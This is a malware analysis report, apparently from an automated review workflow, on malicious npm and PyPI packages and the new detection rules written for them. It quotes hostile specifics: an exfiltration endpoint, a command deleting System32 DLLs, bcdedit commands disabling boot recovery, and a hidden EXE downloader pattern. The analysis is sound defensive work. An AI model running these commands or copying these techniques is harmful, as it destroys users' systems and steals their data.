# Stranded-member review: parser-session, osinthell, zlibxjson

The three containing archives retain the user's confirmed MALICIOUS verdict.
The five listed members were independently judged MALICIOUS from their complete
source, not their containing archive, prior labels, scores, or detection names.
All eight supplied SHA-256 identities were verified. No specimen code was run.

## Member behavior and judgment

- **parser-session 1.1.9 writer.js** collects the entire process environment,
  package version, OS platform, hostname, username, and MAC addresses of
  noninternal IPv4 interfaces. Its exported function decodes the Axios module,
  POST method, HTTPS endpoint, header names/values and `then` from hex, sends
  that record, evaluates the response's `data`, and discards rejection errors.
  Independently decoded endpoint:
  `https://log-server-lovat.vercel.app/api/ipcheck/703`.
  This is covert host/environment export plus arbitrary response-code
  activation in a purported logging/session library. The environment may
  contain secrets, but no particular credential or returned payload is proven.
  The packaged `src/index.js` calls a different, absent pnpm-relative writer;
  this writer's own `../package.json` also resolves to an absent `src/package.json`.
  The declared postinstall script is absent. These activation defects limit
  reachability in this exact archive; they do not make the payload benign.
- **osinthell 1.6.9 v.js** exports a zero-argument action whose only command is
  `del /F /S /Q C:\Windows\System32\*.dll`, through `execSync`, with ignored
  stdio and an empty catch. Indiscriminate essential-DLL destruction with no
  repair, replacement, backup or selection interface tips the verdict.
  `/S` requests recursive deletion; no successful deletion, active Windows
  volume, elevated privilege or privilege escalation is inferred.
- **osinthell 1.6.9 p.js** enumerates C, D, E and F drive roots, joins each
  entry to its root, tests the same path with `statSync(...).isFile()`, and
  overwrites it with an empty string using Node's default write mode. It
  swallows errors throughout. This destroys regular-file contents
  indiscriminately; it is neither recursive traversal nor secure erasure.
- **osinthell 1.6.9 t.js** runs `bcdedit /set {default} bootstatuspolicy
  ignoreallfailures`, then `bcdedit /set {default} recoveryenabled No`, with
  ignored stdio and an empty catch. Failure of the first command skips the
  second. The silent fixed-entry recovery-inhibition action, unrelated to
  the package's generic Utility description, tips the likely-malicious
  verdict. Authorization, administrator rights and the actual default loader
  entry are unknown. No encryption, reboot or persistence is present here.
  The package's `index.js` exposes `sorgu(userId)`, which calls all a–z
  modules, including p, t and v. Import alone does not call these actions;
  preceding module failures could prevent later calls.
- **zlibxjson 8.2 main.py** reads APPDATA, builds a destination basename from
  its fixed Discord attachment URL, streams the response into a `wb` file,
  returns that path and passes it to `subprocess.Popen` with `shell=True`
  and `CREATE_NO_WINDOW`. The wheel's `zlibxjson_command` console entry
  invokes `init`; ordinary import only exports that function. Its only
  substantive entry point silently downloads and launches a third-party EXE,
  with no JSON/compression function and placeholder publisher/repository
  metadata. This supports a malicious downloader verdict. No claim is made
  about the EXE's family, contents or successful execution.

## Coverage and classifier comparison

Counts below are hostile/suspicious, from fresh local slow-mode atomscan runs.
Archive rows count the archive aggregate; every analyzed member was also
compared by path and trait ID. The checked-in `review.json` records those
comparisons and probabilities. The initial queue's risk values differ slightly
from the current engine; the fresh before/after scans are the comparison base.

| Artifact | Before H/S | After H/S | Classifier before → after |
|---|---:|---:|---|
| writer.js | 3/2 | 4/3 | hostile → hostile |
| v.js | 1/3 | 1/3 | suspicious → suspicious |
| p.js | 2/1 | 2/1 | benign → benign |
| t.js | 0/2 | 0/2 | benign → benign |
| main.py | 0/2 | 0/2 | benign → benign |
| parser-session ZIP | 3/2 | 4/3 | hostile → hostile |
| osinthell TGZ | 4/8 | 4/8 | hostile → hostile |
| zlibxjson wheel | 0/2 | 0/2 | hostile → hostile |

The new network-source exfiltration detection follows interface enumeration,
indexed interface records, per-record MAC reads, accumulator writes, the same
returned array, a helper call in the posted object, and the actual concealed
Axios request. Hex decoder and table-index relationships are bound in that
query because mere nearby MAC enumeration cannot prove export. Endpoint,
record key and user-defined identifiers are unconstrained. The hostile
composite additionally requires the existing covert whole-environment export
finding as attack admission. Concealed MAC inventory without that context
remains suspicious. The ordinary hex-parser matcher is required transitively through the
existing environment-export composite, not redefined. This adds a distinct sent source; environment theft, identity
export and response evaluation remain detected independently.

No existing matcher, severity, name or placement was changed. No previously
firing trait or attack finding was lost in any listed file or archive member.
The new traits fire only on writer.js and its archive aggregate in this batch.
The new home is an existing admitted leaf; its exact and ancestor consumers
were inspected. The current batch comparison found no unintended downstream
composite changes.

**Remaining gaps:** p.js has two hostile corroborations for one truncation
outcome and v.js has one hostile for one DLL-destruction outcome. They have no
additional independent hostile behaviors to reach three. For t.js, both boot
settings, synchronous execution, silent stdio and discarded errors were
investigated together; authorized boot administration remains a plausible
near miss. For main.py, the linked download/hidden launch, Discord EXE source,
AppData staging and lack of payload verification were traced; legitimate
updaters can share that combination. Neither case supports a reusable hostile
rule without a stronger admission condition. Their two suspicious findings
are retained, and the hostile-intent detection gaps remain open. The classifier
also undercalls p.js, t.js and main.py as benign and v.js as suspicious despite
the byte-based judgments; no inaccurate rules were added to manipulate scores.
The writer now has four hostile findings for four distinct sent/executed sources
or results. No unsupported persistence, credential family or final-stage
behavior was invented.

## Verification and artifact recovery

Run `python3 testdata/stranded-network-export/check.py` from this checkout.
Thirty assertions cover 15 static fixtures: real-flow and renamed-flow
positives; broken request-body, helper, return, accumulator, interface-map,
entry, module, method, decoder and field bindings; benign local inventory;
and MAC export without the whole-environment admission condition. Fixtures
retain source behavior but replace the live collector with an example.invalid
endpoint. They must never be imported or executed. Existing hostile findings
on negative controls are intentional: those controls isolate the new claim.

`atomscan --no-update --analyze local --mode slow -f json` and `cleave facts`
were run on all five original members and all three original archives.
Decoded strings, symbol calls, archive entry points, source control/data flow
and producer limitations were inspected. Final rescans compare every original
trait and severity, not just aggregate counts. The model reports a v18 feature
spec with newer engine features absent; this is recorded as a model limitation,
not evidence for the verdicts.

As required for the original PyPI wheel, `forager fetch --all-wheels ...
pkg:pypi/zlibxjson@8.2` was attempted. PyPI metadata returned 404; fallback
browser recovery failed because Chromium's ICU data was unavailable. No
replacement/reconstruction was substituted for the hash-verified original
wheel. A separate `forager fetch` of the exact executable URL returned HTTP
404, leaving its bytes unavailable. Raw scans, facts and fetch logs are under
`scratch/stranded-94cda9-0807ef-a46e55` in the supplied workspace parent.

Exactly one MALICIOUS marker is written beside each original archive and each
listed extracted member. Their one-line notes are reproduced verbatim in
`review.json` for the commit body.
